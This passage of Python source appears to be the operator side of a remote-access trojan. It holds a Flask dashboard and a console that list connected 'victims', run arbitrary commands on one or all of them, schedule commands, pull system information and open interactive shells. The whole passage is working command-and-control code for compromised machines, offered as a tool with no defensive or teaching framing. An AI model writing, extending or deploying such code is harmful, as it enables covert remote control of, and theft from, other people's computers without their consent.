        web_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'web_dashboard')
        return send_file(os.path.join(web_dir, filename))

    @app.route('/<path:filename>')
    def root_static(filename):
        web_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'web_dashboard')
        filepath = os.path.join(web_dir, filename)
        if os.path.exists(filepath):
            return send_file(filepath)
        return 'Not found', 404

    @app.route('/api/victims')
    def api_victims():
        with victims_lock:
            result = []
            for i, v in enumerate(victims):
                result.append({
                    'id': str(i),
                    'alias': html_escape(v.get('name', f'victim-{i}')),
                    'address': html_escape(f"{v['ip'][0]}:{v['ip'][1]}"),
                    'connected': v.get('status', 'unknown') == 'connected',
                    'os': html_escape(v.get('os', '?')),
                    'last_seen': v.get('last_activity', ''),
                    'in_shell': v.get('in_shell', False),
                })
        return jsonify({'victims': result})

    @app.route('/api/rename', methods=['POST'])
    def api_rename():
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data'}), 400
        try:
            idx = int(data.get('id', data.get('index', -1)))
            new_name = str(data.get('alias', data.get('name', ''))).strip()
        except (ValueError, TypeError):
            return jsonify({'error': 'Bad request'}), 400

        if not new_name or len(new_name) > 50:
            return jsonify({'error': 'Name must be 1-50 characters'}), 400
        if not all(c.isalnum() or c in '-_. ' for c in new_name):
            return jsonify({'error': 'Name must be alphanumeric (hyphens/underscores/spaces OK)'}), 400

        with victims_lock:
            if idx < 0 or idx >= len(victims):
                return jsonify({'error': f'Invalid session: {idx}'}), 400
            victims[idx]['name'] = new_name
            logger.info(f'Web: Session {idx} renamed to {new_name}')
        log_activity('rename', f'Session {idx} renamed to {new_name}', session=str(idx))
        return jsonify({'success': True, 'alias': new_name})

    @app.route('/api/command', methods=['POST'])
    def api_command():
        data = request.get_json()
        if not data or 'command' not in data:
            return jsonify({'error': 'No command provided'}), 400

        cmd = str(data['command']).strip()
        target = str(data.get('target', 'all')).strip()

        if len(cmd) > 10000:
            return jsonify({'error': 'Command too long (max 10000 chars)'}), 400
        if cmd.lower() in ('exit', 'quit'):
            return jsonify({'error': 'Use the terminal to disconnect/quit'}), 400
        # 'clear' is a display-only command — acknowledge immediately without touching victims
        if cmd == 'clear':
            return jsonify({'results': [], 'clear': True})

        log_activity('command', f'[{target}] {cmd}', session=target)

        def fmt_resp(resp):
            """Turn any victim response into a plain string for the API."""
            if resp is None:
                return None
            if resp.get('type') == 'error':
                return None  # caller handles errors separately
            if resp.get('type') == 'sysinfo':
                d = resp.get('data', {})
                return '\n'.join(f'{k}: {v}' for k, v in sorted(d.items()))
            return resp.get('data', '')

        results = []
        if target == 'all':
            responses = send_to_all(cmd)
            for idx, resp in responses:
                with victims_lock:
                    vname = victims[idx].get('name', f'victim-{idx}') if idx < len(victims) else str(idx)
                if resp is None:
                    results.append({'id': str(idx), 'error': 'No response or disconnected'})
                    with victims_lock:
                        if idx < len(victims):
                            victim_log_cmd(victims[idx], cmd, target='all')
                            victim_log_resp(victims[idx], error='No response or disconnected')
                elif resp.get('type') == 'error':
                    results.append({'id': str(idx), 'error': resp.get('message', 'Unknown error')})
                    with victims_lock:
                        if idx < len(victims):
                            victim_log_cmd(victims[idx], cmd, target='all')
                            victim_log_resp(victims[idx], error=resp.get('message', ''))
                else:
                    out = fmt_resp(resp)
                    results.append({'id': str(idx), 'output': out})
                    with victims_lock:
                        if idx < len(victims):
                            victim_log_cmd(victims[idx], cmd, target='all')
                            victim_log_resp(victims[idx], output=out)
        else:
            try:
                idx = int(target)
            except (ValueError, TypeError):
                return jsonify({'error': 'Invalid target — expected a numeric session id'}), 400

            with victims_lock:
                if idx < 0 or idx >= len(victims):
                    return jsonify({'error': f'Invalid session: {idx}'}), 400
                v = victims[idx]
            if v['status'] != 'connected':
                return jsonify({'error': f'Session {idx} is disconnected'}), 400
            if v.get('in_shell'):
                return jsonify({'error': f'Session {idx} is in use by terminal shell'}), 400
            if not is_socket_alive(v['socket']):
                v['status'] = 'disconnected'
                return jsonify({'error': f'Session {idx} connection is dead'}), 400

            resp = safe_victim_command(v, cmd, timeout=10)
            v['last_activity'] = datetime.datetime.now().isoformat()
            if resp is None:
                results.append({'id': str(idx), 'error': 'No response'})
                victim_log_cmd(v, cmd)
                victim_log_resp(v, error='No response')
            elif resp.get('type') == 'error':
                results.append({'id': str(idx), 'error': resp.get('message', 'Unknown error')})
                victim_log_cmd(v, cmd)
                victim_log_resp(v, error=resp.get('message', 'Unknown error'))
            else:
                out = fmt_resp(resp)
                results.append({'id': str(idx), 'output': out})
                victim_log_cmd(v, cmd)
                victim_log_resp(v, output=out)

        return jsonify({'results': results})

    @app.route('/api/activity')
    def api_activity():
        """Return the activity log (most recent N entries)."""
        try:
            limit = int(request.args.get('limit', 100))
            limit = max(1, min(limit, ACTIVITY_LOG_MAX))
        except (ValueError, TypeError):
            limit = 100
        with activity_log_lock:
            raw = list(activity_log[-limit:])
        # Normalise time to a short HH:MM:SS string for the frontend
        entries = []
        for e in raw:
            t = e.get('time', '')
            try:
                t = datetime.datetime.fromisoformat(t).strftime('%H:%M:%S')
            except (ValueError, TypeError):
                pass
            entries.append({'action': e.get('action', ''), 'detail': e.get('detail', ''), 'time': t})
        return jsonify({'activity': entries})

    @app.route('/api/sysinfo/<victim_id>')
    def api_sysinfo(victim_id):
        """Request sysinfo from a specific victim and return it."""
        try:
            idx = int(victim_id)
        except (ValueError, TypeError):
            return jsonify({'error': f'Invalid session id: {victim_id}'}), 400
        with victims_lock:
            if idx < 0 or idx >= len(victims):
                return jsonify({'error': f'Invalid session: {idx}'}), 400
            v = victims[idx]
        if v['status'] != 'connected':
            return jsonify({'error': 'Session is disconnected'}), 400
        if v.get('in_shell'):
            return jsonify({'error': 'Session is in use by terminal shell'}), 400
        resp = safe_victim_command(v, 'sysinfo', timeout=15)
        v['last_activity'] = datetime.datetime.now().isoformat()
        log_activity('sysinfo', 'Requested via web', session=v.get('name'))
        if resp and resp.get('type') == 'sysinfo':
            # Return the sysinfo fields directly so JS can Object.entries() them
            return jsonify(resp.get('data', {}))
        elif resp and resp.get('type') == 'error':
            return jsonify({'error': resp.get('message', 'Unknown error')}), 400
        return jsonify({'error': 'No response'}), 504

    @app.route('/api/schedules')
    def api_schedules():
        """Return list of pending scheduled tasks."""
        with scheduled_lock:
            result = []
            for task in scheduled_tasks:
                vi = task['victim_index']
                result.append({
                    'time': task['run_at'].strftime('%H:%M'),
                    'command': task['command'],
                    'target': 'all' if vi < 0 else str(vi),
                })
        return jsonify({'schedules': result})

    @app.route('/api/schedule', methods=['POST'])
    def api_schedule():
        """Schedule a command from the web dashboard."""
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data'}), 400
        time_str = str(data.get('time', '')).strip()
        cmd = str(data.get('command', '')).strip()
        target = str(data.get('target', data.get('index', 'all'))).strip()
        if not cmd or not time_str:
            return jsonify({'error': 'Missing command or time'}), 400
        if len(cmd) > 10000:
            return jsonify({'error': 'Command too long'}), 400
        # Resolve target to victim index (-1 means all)
        if target == 'all':
            idx = -1
        else:
            try:
                idx = int(target)
            except (ValueError, TypeError):
                return jsonify({'error': 'Invalid target'}), 400
            with victims_lock:
                if idx < 0 or idx >= len(victims):
                    return jsonify({'error': f'Invalid session: {idx}'}), 400
        try:
            hour, minute = map(int, time_str.split(':'))
            if not (0 <= hour <= 23 and 0 <= minute <= 59):
                raise ValueError
        except (ValueError, IndexError):
            return jsonify({'error': 'Time must be HH:MM'}), 400
        now_dt = datetime.datetime.now()
        run_at = now_dt.replace(hour=hour, minute=minute, second=0, microsecond=0)
        if run_at <= now_dt:
            run_at += datetime.timedelta(days=1)
        with scheduled_lock:
            scheduled_tasks.append({
                'victim_index': idx,
                'command': cmd,
                'run_at': run_at,
            })
        log_activity('schedule', f'{cmd} on {target} at {run_at.strftime("%H:%M")}', session=target)
        return jsonify({'success': True, 'run_at': run_at.strftime('%Y-%m-%d %H:%M')})

    @app.route('/api/clear', methods=['POST'])
    def api_clear():
        """Remove disconnected sessions."""
        with victims_lock:
            before = len(victims)
            for v in victims:
                if v['status'] != 'connected':
                    try:
                        v['socket'].close()
                    except OSError:
                        pass
            victims[:] = [v for v in victims if v['status'] == 'connected']
            after = len(victims)
        removed = before - after
        log_activity('clear', f'Removed {removed} disconnected sessions')
        return jsonify({'removed': removed, 'remaining': after})

    @app.route('/api/disconnect', methods=['POST'])
    def api_disconnect():
        """Gracefully close one or all victim connections."""
        data   = request.get_json() or {}
        target = str(data.get('target', 'all')).strip()

        def kick(v):
            """Send exit, close socket, mark disconnected, close log."""
            try:
                protocol_send(v['socket'], {'type': 'command', 'command': 'exit'})
            except Exception:
                pass
            try:
                v['socket'].close()
            except OSError:
                pass
            v['status'] = 'disconnected'
            victim_log_cmd(v, '(session kicked from web dashboard)', target='system')
            close_victim_log(v)

        kicked = []
        if target == 'all':
            with victims_lock:
                for i, v in enumerate(victims):
                    if v['status'] == 'connected':
                        kick(v)
                        kicked.append(str(i))
        else:
            try:
                idx = int(target)
            except (ValueError, TypeError):
                return jsonify({'error': 'Invalid target'}), 400
            with victims_lock:
                if idx < 0 or idx >= len(victims):
                    return jsonify({'error': f'Invalid session: {idx}'}), 400
                v = victims[idx]
                if v['status'] == 'connected':
                    kick(v)
                    kicked.append(str(idx))

        names = ', '.join(kicked) if kicked else 'none'
        log_activity('disconnect', f'Kicked session(s): {names} (web)')
        return jsonify({'kicked': kicked})

    try:
        from werkzeug.serving import make_server
    except ImportError:
        print(YELLOW + '[*] Werkzeug not available. Web dashboard disabled.' + RESET)
        return None

    class DashboardServer(threading.Thread):
        def __init__(self, flask_app, web_port):
            super().__init__(daemon=True)
            self.srv = make_server('0.0.0.0', web_port, flask_app)
            self.srv.timeout = 1

        def run(self):
            self.srv.serve_forever()

        def shutdown(self):
            self.srv.shutdown()

    try:
        dashboard_srv = DashboardServer(app, port)
        dashboard_srv.start()
        print(GREEN + f'[+] Web dashboard: http://localhost:{port}' + RESET)
        logger.info(f'Web dashboard on port {port}')
        return dashboard_srv
    except OSError as e:
        print(RED + f'[-] Could not start web dashboard: {e}' + RESET)
        return None


# ============================================================================================
# MAIN
# ============================================================================================

def main():
    global sock, ssl_context, stop_server

    ssl_context = create_ssl_context_host()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(('0.0.0.0', args.port))
    except OSError as e:
        print(RED + f'[-] Cannot bind to port {args.port}: {e}' + RESET)
        sys.exit(1)
    sock.listen(5)
    stop_server = False

    # Ensure downloads directory exists
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)

    print(GREEN + BANNER + RESET)
    if args.debug:
        print(CYAN + '[DEBUG] Debug mode ON — logging to logs/host.log' + RESET)
    if AUTH_KEY_HASH:
        print(CYAN + '[+] Authentication enabled' + RESET)
    else:
        print(YELLOW + '[*] No --auth-key set. Any victim can connect.' + RESET)
    if ssl_context:
        print(CYAN + '[+] TLS encryption enabled' + RESET)
    else:
        print(YELLOW + '[*] TLS disabled — communication is unencrypted' + RESET)
    print(YELLOW + f'[+] Listening on 0.0.0.0:{args.port}' + RESET)
    print(YELLOW + "[+] Type 'help' for available commands" + RESET)

    # Background threads (all daemon so they die with main)
    threading.Thread(target=server, daemon=True).start()
    threading.Thread(target=scheduler_thread, daemon=True).start()
    threading.Thread(target=heartbeat_thread, daemon=True).start()

    dashboard_server = None
    if not args.no_web:
        dashboard_server = start_web_dashboard(args.web_port)

    # ==================== COMMAND CENTER LOOP ====================
    try:
        while True:
            try:
                command = input('*Center: ')
            except (EOFError, KeyboardInterrupt):
                print()
                command = 'quit'

            command = command.strip()
            if not command:
                continue

            # --- TARGETS ---
            if command == 'targets':
                with victims_lock:
                    if not victims:
                        print(YELLOW + '[*] No victims connected.' + RESET)
                    else:
                        conn = sum(1 for v in victims if v['status'] == 'connected')
                        disc = len(victims) - conn
                        print(YELLOW + f'\n  Total: {len(victims)}  |  Connected: {conn}  |  Disconnected: {disc}' + RESET)
                        print(YELLOW + f'\n  {"#":<4} {"Name":<20} {"IP":<22} {"Status":<14} {"Last Activity"}' + RESET)
                        print(YELLOW + '  ' + '-' * 78 + RESET)
                        for i, v in enumerate(victims):
                            sc = GREEN if v['status'] == 'connected' else RED
                            ip_str = f"{v['ip'][0]}:{v['ip'][1]}"
                            last = v.get('last_activity', '-')
                            shell_indicator = ' [SHELL]' if v.get('in_shell') else ''
                            print(f'  {i:<4} {v["name"]:<20} {ip_str:<22} {sc}{v["status"]:<14}{RESET} {last}{shell_indicator}')
                        print()

            # --- HELP ---
            elif command == 'help':
                show_center_help()

            # --- CLEAR ---
            elif command == 'clear':
                with victims_lock:
                    before = len(victims)
                    # Close sockets for disconnected victims
                    for v in victims:
                        if v['status'] != 'connected':
                            try:
                                v['socket'].close()
                            except OSError:
                                pass
                    victims[:] = [v for v in victims if v['status'] == 'connected']
                    after = len(victims)
                removed = before - after
                print(GREEN + f'[+] Removed {removed} disconnected session(s). {after} remaining.' + RESET)
                logger.info(f'Cleared {removed} disconnected sessions')

            # --- DEBUG ---
            elif command == 'debug':
                if logger.level == logging.DEBUG:
                    logger.setLevel(logging.WARNING)
                    print(YELLOW + '[*] Debug mode OFF' + RESET)
                else:
                    os.makedirs(log_dir, exist_ok=True)
                    if not any(isinstance(h, logging.FileHandler) for h in logger.handlers):
                        fh = logging.FileHandler(os.path.join(log_dir, 'host.log'))
                        fh.setLevel(logging.DEBUG)
                        fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
                        logger.addHandler(fh)
                    logger.setLevel(logging.DEBUG)
                    print(CYAN + '[DEBUG] Debug mode ON — logging to logs/host.log' + RESET)

            # --- NAME ---
            elif command.startswith('name '):
                parts = command.split(None, 2)
                if len(parts) < 3:
                    print(RED + '[-] Usage: name <session#> <name>' + RESET)
                else:
                    try:
                        idx = int(parts[1])
                        new_name = parts[2].strip()
                        if len(new_name) > 50:
                            print(RED + '[-] Name too long (max 50 chars)' + RESET)
                        elif not all(c.isalnum() or c in '-_' for c in new_name):
                            print(RED + '[-] Name must be alphanumeric (hyphens/underscores OK)' + RESET)
                        else:
                            with victims_lock:
                                if 0 <= idx < len(victims):
                                    victims[idx]['name'] = new_name
                                    print(GREEN + f'[+] Session {idx} renamed to "{new_name}"' + RESET)
                                    logger.info(f'Session {idx} renamed to {new_name}')
                                else:
                                    print(RED + f'[-] Invalid session: {idx}' + RESET)
                    except ValueError:
                        print(RED + '[-] Usage: name <session#> <name>' + RESET)

            # --- SESSION ---
            elif command.startswith('session'):
                parts = command.split()
                if len(parts) != 2:
                    print(RED + '[-] Usage: session <number>' + RESET)
                    continue
                try:
                    num = int(parts[1])
                    with victims_lock:
                        if num < 0 or num >= len(victims):
                            print(RED + '[-] Invalid session number.' + RESET)
                            continue
                        victim_info = victims[num]
                    if victim_info['status'] != 'connected':
                        print(RED + '[-] Session is disconnected.' + RESET)
                        continue
                    if not is_socket_alive(victim_info['socket']):
                        victim_info['status'] = 'disconnected'
                        print(RED + '[-] Victim has disconnected.' + RESET)
                        continue
                    run(victim_info)
                except ValueError:
                    print(RED + '[-] Usage: session <number>' + RESET)

            # --- SCHEDULE ---
            elif command.startswith('schedule '):
                parts = command.split(None, 3)
                if len(parts) < 4:
                    print(RED + '[-] Usage: schedule <session#> <HH:MM> <command>' + RESET)
                    print(YELLOW + '    Example: schedule 0 14:30 whoami' + RESET)
                    continue
                try:
                    idx = int(parts[1])
                    time_str = parts[2]
                    cmd = parts[3]

                    # Validate session index now
                    with victims_lock:
                        if idx < 0 or idx >= len(victims):
                            print(RED + f'[-] Invalid session: {idx}' + RESET)
                            continue

                    hour, minute = map(int, time_str.split(':'))
                    if not (0 <= hour <= 23 and 0 <= minute <= 59):
                        raise ValueError('Invalid time')
                    now = datetime.datetime.now()
                    run_at = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if run_at <= now:
                        run_at += datetime.timedelta(days=1)
                    with scheduled_lock:
                        scheduled_tasks.append({
                            'victim_index': idx,
                            'command': cmd,
                            'run_at': run_at,
                        })
                    print(GREEN + f'[+] Scheduled "{cmd}" on Session {idx} at {run_at.strftime("%Y-%m-%d %H:%M")}' + RESET)
                    logger.info(f'Scheduled: "{cmd}" session {idx} at {run_at}')
                except (ValueError, IndexError):
                    print(RED + '[-] Usage: schedule <session#> <HH:MM> <command>' + RESET)

            # --- SCHEDULES (list pending) ---
            elif command == 'schedules':
                with scheduled_lock:
                    if not scheduled_tasks:
                        print(YELLOW + '[*] No pending scheduled tasks.' + RESET)
                    else:
                        print(YELLOW + f'\n  {"#":<4} {"Session":<10} {"Time":<20} {"Command"}' + RESET)
                        print(YELLOW + '  ' + '-' * 60 + RESET)
                        for i, task in enumerate(scheduled_tasks):
                            print(f'  {i:<4} {task["victim_index"]:<10} {task["run_at"].strftime("%Y-%m-%d %H:%M"):<20} {task["command"]}')
                        print()

            # --- SENDALL ---
            elif command.startswith('sendall '):
                cmd = command[8:].strip()
                if not cmd:
                    print(RED + '[!] No command provided.' + RESET)
                    continue
                if len(cmd) > 10000:
                    print(RED + '[!] Command too long (max 10000 chars).' + RESET)
                    continue

                with victims_lock:
                    conn_count = sum(1 for v in victims if v['status'] == 'connected' and not v.get('in_shell'))
                if conn_count == 0:
                    print(YELLOW + '[*] No available victims (connected & not in shell).' + RESET)
                    continue

                print(GREEN + f'[+] Sending to {conn_count} victim(s)...' + RESET)
                responses = send_to_all(cmd)

                for idx, resp in responses:
                    with victims_lock:
                        vname = victims[idx]['name'] if idx < len(victims) else f'Session {idx}'
                    if resp is None:
                        print(RED + f'  [{vname}] No response / disconnected / in-shell' + RESET)
                    elif resp.get('type') == 'error':
                        print(RED + f'  [{vname}] Error: {resp.get("message", "?")}' + RESET)
                    else:
                        print(YELLOW + f'\n--- {vname} ---' + RESET)
                        print(resp.get('data', '') or '(no output)')

                print(GREEN + '\n[+] All responses collected.' + RESET)

            # --- QUIT ---
            elif command == 'quit':
                print(YELLOW + '[*] Shutting down...' + RESET)
                stop_server = True

                with victims_lock:
                    for v in victims:
                        if v['status'] == 'connected':
                            try:
                                protocol_send(v['socket'], {'type': 'command', 'command': 'exit'})
                                v['socket'].close()
                            except OSError:
                                pass

                try:
                    sock.close()
                except OSError:
                    pass

                if dashboard_server:
                    try:
                        dashboard_server.shutdown()
                    except Exception:
                        pass

                logger.info('Host shutdown complete')
                print(GREEN + '[+] Exiting Command Center...' + RESET)
                break

            # --- UNKNOWN ---
            else:
                print(RED + '[!] Unknown command. Type "help" for available commands.' + RESET)

    except Exception as e:
        logger.error(f'Main loop error: {e}')
        print(RED + f'[-] Fatal error: {e}' + RESET)
    finally:
        stop_server = True


if __name__ == '__main__':
    main()
